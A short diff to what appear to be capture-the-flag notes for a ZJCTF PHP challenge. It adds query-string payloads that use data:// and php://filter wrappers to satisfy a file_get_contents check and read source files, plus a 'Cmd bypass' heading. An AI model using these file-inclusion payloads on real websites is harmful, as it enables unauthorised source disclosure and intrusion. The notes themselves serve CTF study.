@@ -33,7 +33,8 @@
 
 ### bypass file_get_contents($text,'r')==="welcome to the zjctf"
 
-`?text=data://test/plain,welcome&file=php://filter/resource=useless.php`
+`?text=data://test/plain,welcome to the zjctf&file=php://filter/resource=useless.php`
+`?text=data://test/plain,I have a dream&file=php://filter/resource=next.php`
 
 # Cmd bypass
 
